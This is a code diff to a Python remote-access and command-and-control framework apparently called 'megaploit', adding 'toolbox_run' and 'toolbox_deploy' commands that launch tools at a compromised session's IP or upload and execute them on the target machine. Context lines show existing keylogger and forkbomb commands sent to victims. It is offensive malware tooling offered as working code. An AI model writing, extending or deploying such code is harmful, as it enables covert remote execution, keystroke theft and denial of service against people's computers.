@@ -16,6 +16,9 @@ from dataclasses import dataclass
 from megaploit.core.protocol import send_msg, recv_msg, send_file, recv_file
 from megaploit.server.session import Session
 from megaploit.core.config import MAX_RECORD_SECONDS
+from megaploit.toolbox.registry import registry as _tool_registry
+from megaploit.toolbox import installer as _installer
+from megaploit.toolbox import runner as _runner
 
 
 # ---------------------------------------------------------------------------
@@ -224,6 +227,50 @@ def cmd_keylog_stop(session: Session, args: list[str]) -> CommandResult:
 def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
     send_msg(session.conn, "forkbomb")
     return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Toolbox — session-context commands
+# ---------------------------------------------------------------------------
+
+@_cmd(
+    "toolbox_run",
+    usage="toolbox_run <name> [args…]",
+    help_text="Run a toolbox tool locally, targeting the active session's IP",
+)
+def cmd_toolbox_run(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: toolbox_run <tool-name> [args…]")
+    name = args[0]
+    tool_args = args[1:]
+    lines: list[str] = []
+
+    try:
+        _runner.run_local(name, tool_args, output=lines.append)
+    except RuntimeError as e:
+        return _err(str(e))
+
+    return _ok("\n".join(lines))
+
+
+@_cmd(
+    "toolbox_deploy",
+    usage="toolbox_deploy <name> [args…]",
+    help_text="Upload tool entry-point to target and execute it there",
+)
+def cmd_toolbox_deploy(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: toolbox_deploy <tool-name> [args…]")
+    name = args[0]
+    tool_args = args[1:]
+    lines: list[str] = []
+
+    try:
+        _runner.run_remote(name, tool_args, session, output=lines.append)
+    except RuntimeError as e:
+        return _err(str(e))
+
+    return _ok("\n".join(lines))
 
 
 # ---------------------------------------------------------------------------
